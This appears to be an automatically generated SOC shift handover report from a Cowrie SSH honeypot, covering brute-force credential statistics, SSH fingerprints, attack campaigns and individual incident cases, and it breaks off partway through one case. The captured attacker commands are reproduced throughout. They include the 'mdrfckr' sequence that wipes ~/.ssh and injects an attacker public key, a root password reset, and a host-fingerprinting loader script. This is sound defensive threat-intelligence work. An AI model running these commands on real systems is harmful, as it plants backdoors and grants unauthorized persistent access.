# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-14 |
| **Generated At** | 2026-10-14T16:11:24Z |
| **Shift Time** | 16:11 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **390** |
| Confirmed Threats | **355** |
| False Positives Filtered | **35** (9.0%) |
| Unique Attacker IPs | **243** |
| Countries of Origin | **44** |
| High Severity Cases | **186** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **204** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 5 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **3010** |
| Unique Credential Pairs | **2795** |
| Unique Usernames | **1612** |
| Unique Passwords | **1274** |
| Successful Auth Pairs | **2906** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 182 |
| `345gs5662d34` | 79 |
| `admin` | 31 |
| `support` | 26 |
| `pi` | 16 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 79 |
| `3245gs5662d34` | 78 |
| `support` | 29 |
| `123456` | 15 |
| `` | 14 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 79 |
| `root` | `3245gs5662d34` | 33 |
| `support` | `support` | 25 |
| `root` | `` | 14 |
| `admin` | `admin` | 12 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `alpesh` | `tactical` | `109.160.32.159` | 2026-10-14T00:55:05 |
| `utsb` | `gituser` | `109.160.32.159` | 2026-10-14T00:55:10 |
| `pey4` | `password1` | `109.160.32.159` | 2026-10-14T00:55:14 |
| `pi` | `starfish` | `121.167.171.219` | 2026-10-14T01:14:09 |
| `root` | `!root` | `195.178.110.232` | 2026-10-14T01:17:24 |
| `root` | `111111` | `195.178.110.232` | 2026-10-14T01:19:08 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-10-14T01:19:59 |
| `root` | `123123` | `195.178.110.232` | 2026-10-14T01:20:49 |
| `sysadmin` | `1234` | `203.128.6.159` | 2026-10-14T01:21:03 |
| `345gs5662d34` | `345gs5662d34` | `203.128.6.159` | 2026-10-14T01:21:07 |
| `sysadmin` | `3245gs5662d34` | `203.128.6.159` | 2026-10-14T01:21:09 |
| `root` | `123321` | `195.178.110.232` | 2026-10-14T01:22:32 |
| `root` | `1q2w3ezxc` | `43.133.140.5` | 2026-10-14T01:22:37 |
| `345gs5662d34` | `345gs5662d34` | `43.133.140.5` | 2026-10-14T01:22:41 |
| `root` | `3245gs5662d34` | `43.133.140.5` | 2026-10-14T01:22:43 |
| `support` | `support` | `176.53.159.196` | 2026-10-14T01:23:37 |
| `root` | `1234` | `195.178.110.232` | 2026-10-14T01:24:17 |
| `root` | `12345` | `195.178.110.232` | 2026-10-14T01:25:53 |
| `root` | `1234567` | `195.178.110.232` | 2026-10-14T01:29:07 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `150.107.38.40` | 2026-10-14T01:29:46 |
_… 2886 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **390** |
| Sessions with Fingerprint | **28** |
| Unique HASSH Fingerprints | **28** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 170 |
| Go SSH scanner | 61 |
| PuTTY | 6 |
| AsyncSSH (Python) | 3 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 120 | 65 |
| `03a80b21afa8...` | Modern SSH client | 23 | 11 |
| `084386fa7ae5...` | Mirai/variant | 9 | 9 |
| `0a07365cc01f...` | Generic scanner | 8 | 6 |
| `2ec37a7cc8da...` | Mirai/variant | 8 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 120 | 65 | Mirai/variant |
| `03a80b21afa8...` | libssh | 23 | 11 | Modern SSH client |
| `95420f9d932d...` | libssh | 22 | 15 | — |
| `084386fa7ae5...` | Go SSH scanner | 9 | 9 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 8 | 6 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 8 | 4 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 6 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **16** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 85 | 4 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 60 | 55 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:yr5G6SVfPC07"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `121.15.140.235`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.232`, `2.57.122.168`, `2.57.122.150`, `2.57.122.74`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `144.31.146.233`, `103.117.150.125`, `181.123.62.21`, `156.225.14.74`, `87.106.63.76`, `189.203.163.10`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **243** |
| Unique ASNs | **105** |
| High-Risk ASNs | **83** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 69 | HIGH |
| `AS4766` | Korea Telecom | 14 | HIGH |
| `AS396982` | Google LLC | 11 | HIGH |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS4811` | China Telecom (Group) | 6 | HIGH |
| `AS14061` | DigitalOcean, LLC | 5 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (181)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-dcd9865d06f4

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]159` |
| **First Seen** | 2026-10-14 00:55 |
| **Last Seen** | 2026-10-14 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 00:55:05` | `cowrie.session.connect` |
| `2026-10-14 00:55:05` | `cowrie.client.version` |
| `2026-10-14 00:55:05` | `cowrie.client.kex` |
| `2026-10-14 00:55:05` | `cowrie.login.success` |
| `2026-10-14 00:55:06` | `cowrie.session.params` |
| `2026-10-14 00:55:06` | `cowrie.command.input` |
| `2026-10-14 00:55:06` | `cowrie.log.closed` |
| `2026-10-14 00:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]159` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-491d87a96c01

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-10-14 01:17 |
| **Last Seen** | 2026-10-14 01:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 01:17:21` | `cowrie.session.connect` |
| `2026-10-14 01:17:22` | `cowrie.client.version` |
| `2026-10-14 01:17:22` | `cowrie.client.kex` |
| `2026-10-14 01:17:24` | `cowrie.login.success` |
| `2026-10-14 01:17:25` | `cowrie.session.params` |
| `2026-10-14 01:17:25` | `cowrie.command.input` |
| `2026-10-14 01:17:25` | `cowrie.command.input` |
| `2026-10-14 01:17:25` | `cowrie.command.input` |
| `2026-10-14 01:17:25` | `cowrie.command.input` |
| `2026-10-14 01:17:25` | `cowrie.command.input` |
| `2026-10-14 01:17:25` | `cowrie.command.success` |
| `2026-10-14 01:17:25` | `cowrie.command.input` |
| `2026-10-14 01:17:25` | `cowrie.command.input` |
| `2026-10-14 01:17:25` | `cowrie.command.input` |
| `2026-10-14 01:17:25` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f41235f6d923

| Field | Detail |
|---|---|
| **Source IP** | `203.128.6[.]159` |
| **First Seen** | 2026-10-14 01:21 |
| **Last Seen** | 2026-10-14 01:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 01:21:02` | `cowrie.session.connect` |
| `2026-10-14 01:21:02` | `cowrie.client.version` |
| `2026-10-14 01:21:02` | `cowrie.client.kex` |
| `2026-10-14 01:21:03` | `cowrie.login.success` |
| `2026-10-14 01:21:04` | `cowrie.session.params` |
| `2026-10-14 01:21:04` | `cowrie.command.input` |
| `2026-10-14 01:21:04` | `cowrie.command.failed` |
| `2026-10-14 01:21:05` | `cowrie.log.closed` |
| `2026-10-14 01:21:06` | `cowrie.session.params` |
| `2026-10-14 01:21:06` | `cowrie.command.input` |
| `2026-10-14 01:21:06` | `cowrie.session.file_download` |
| `2026-10-14 01:21:06` | `cowrie.log.closed` |
| `2026-10-14 01:21:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.128.6[.]159` to AbuseIPDB if not already reported
- [ ] Block `203.128.6[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab195e4cdd5e

| Field | Detail |
|---|---|
| **Source IP** | `203.128.6[.]159` |
| **First Seen** | 2026-10-14 01:21 |
| **Last Seen** | 2026-10-14 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 01:21:06` | `cowrie.session.connect` |
| `2026-10-14 01:21:06` | `cowrie.client.version` |
| `2026-10-14 01:21:06` | `cowrie.client.kex` |
| `2026-10-14 01:21:07` | `cowrie.login.success` |
| `2026-10-14 01:21:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.128.6[.]159` to AbuseIPDB if not already reported
- [ ] Block `203.128.6[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d29b22ccb3c

| Field | Detail |
|---|---|
| **Source IP** | `43.133.140[.]5` |
| **First Seen** | 2026-10-14 01:22 |
| **Last Seen** | 2026-10-14 01:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 01:22:36` | `cowrie.session.connect` |
| `2026-10-14 01:22:36` | `cowrie.client.version` |
| `2026-10-14 01:22:36` | `cowrie.client.kex` |
| `2026-10-14 01:22:37` | `cowrie.login.success` |
| `2026-10-14 01:22:38` | `cowrie.session.params` |
| `2026-10-14 01:22:38` | `cowrie.command.input` |
| `2026-10-14 01:22:38` | `cowrie.command.failed` |
| `2026-10-14 01:22:38` | `cowrie.log.closed` |
| `2026-10-14 01:22:39` | `cowrie.session.params` |
| `2026-10-14 01:22:39` | `cowrie.command.input` |
| `2026-10-14 01:22:39` | `cowrie.session.file_download` |
| `2026-10-14 01:22:39` | `cowrie.log.closed` |
| `2026-10-14 01:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.133.140[.]5` to AbuseIPDB if not already reported
- [ ] Block `43.133.140[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b15033e8915

| Field | Detail |
|---|---|
| **Source IP** | `43.133.140[.]5` |
| **First Seen** | 2026-10-14 01:22 |
| **Last Seen** | 2026-10-14 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 01:22:40` | `cowrie.session.connect` |
| `2026-10-14 01:22:40` | `cowrie.client.version` |
| `2026-10-14 01:22:40` | `cowrie.client.kex` |
| `2026-10-14 01:22:41` | `cowrie.login.success` |
| `2026-10-14 01:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.133.140[.]5` to AbuseIPDB if not already reported
- [ ] Block `43.133.140[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9b7cabd31cb

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-14 01:23 |
| **Last Seen** | 2026-10-14 01:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 01:23:37` | `cowrie.session.connect` |
| `2026-10-14 01:23:37` | `cowrie.client.version` |
| `2026-10-14 01:23:37` | `cowrie.client.kex` |
| `2026-10-14 01:23:37` | `cowrie.login.success` |
| `2026-10-14 01:23:37` | `cowrie.direct-tcpip.request` |
| `2026-10-14 01:23:37` | `cowrie.direct-tcpip.data` |
| `2026-10-14 01:23:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4abdf496872e

| Field | Detail |
|---|---|
| **Source IP** | `150.107.38[.]40` |
| **First Seen** | 2026-10-14 01:29 |
| **Last Seen** | 2026-10-14 01:29 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 01:29:09` | `cowrie.session.connect` |
| `2026-10-14 01:29:09` | `cowrie.login.success` |
| `2026-10-14 01:29:10` | `cowrie.session.params` |
| `2026-10-14 01:29:28` | `cowrie.log.closed` |
| `2026-10-14 01:29:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.107.38[.]40` to AbuseIPDB if not already reported
- [ ] Block `150.107.38[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df52db4ab6b

| Field | Detail |
|---|---|
| **Source IP** | `150.107.38[.]40` |
| **First Seen** | 2026-10-14 01:29 |
| **Last Seen** | 2026-10-14 01:30 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6, User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0[.]0 Safari/537.36 Edg/120.0.0[.]0` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 01:29:46` | `cowrie.session.connect` |
| `2026-10-14 01:29:46` | `cowrie.login.success` |
| `2026-10-14 01:29:47` | `cowrie.session.params` |
| `2026-10-14 01:29:47` | `cowrie.command.input` |
| `2026-10-14 01:29:47` | `cowrie.command.failed` |
| `2026-10-14 01:29:47` | `cowrie.command.input` |
| `2026-10-14 01:29:47` | `cowrie.command.input` |
| `2026-10-14 01:30:05` | `cowrie.log.closed` |
| `2026-10-14 01:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.107.38[.]40` to AbuseIPDB if not already reported
- [ ] Block `150.107.38[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed3f4c3a6857

| Field | Detail |
|---|---|
| **Source IP** | `45.121.25[.]115` |
| **First Seen** | 2026-10-14 01:44 |
| **Last Seen** | 2026-10-14 01:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 01:44:25` | `cowrie.session.connect` |
| `2026-10-14 01:44:25` | `cowrie.client.version` |
| `2026-10-14 01:44:25` | `cowrie.client.kex` |
| `2026-10-14 01:44:26` | `cowrie.login.success` |
| `2026-10-14 01:44:27` | `cowrie.session.params` |
| `2026-10-14 01:44:27` | `cowrie.command.input` |
| `2026-10-14 01:44:27` | `cowrie.command.failed` |
| `2026-10-14 01:44:28` | `cowrie.log.closed` |
| `2026-10-14 01:44:29` | `cowrie.session.params` |
| `2026-10-14 01:44:29` | `cowrie.command.input` |
| `2026-10-14 01:44:29` | `cowrie.session.file_download` |
| `2026-10-14 01:44:29` | `cowrie.log.closed` |
| `2026-10-14 01:44:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.121.25[.]115` to AbuseIPDB if not already reported
- [ ] Block `45.121.25[.]115` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef0e40879b67

| Field | Detail |
|---|---|
| **Source IP** | `45.121.25[.]115` |
| **First Seen** | 2026-10-14 01:44 |
| **Last Seen** | 2026-10-14 01:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 01:44:29` | `cowrie.session.connect` |
| `2026-10-14 01:44:29` | `cowrie.client.version` |
| `2026-10-14 01:44:29` | `cowrie.client.kex` |
| `2026-10-14 01:44:30` | `cowrie.login.success` |
| `2026-10-14 01:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.121.25[.]115` to AbuseIPDB if not already reported
- [ ] Block `45.121.25[.]115` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58aa13063f86

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-14 02:00 |
| **Last Seen** | 2026-10-14 02:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 02:00:12` | `cowrie.session.connect` |
| `2026-10-14 02:00:12` | `cowrie.client.version` |
| `2026-10-14 02:00:12` | `cowrie.client.kex` |
| `2026-10-14 02:00:12` | `cowrie.login.success` |
| `2026-10-14 02:00:12` | `cowrie.direct-tcpip.request` |
| `2026-10-14 02:00:12` | `cowrie.direct-tcpip.data` |
| `2026-10-14 02:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbed2b0684ce

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-10-14 02:36 |
| **Last Seen** | 2026-10-14 02:37 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
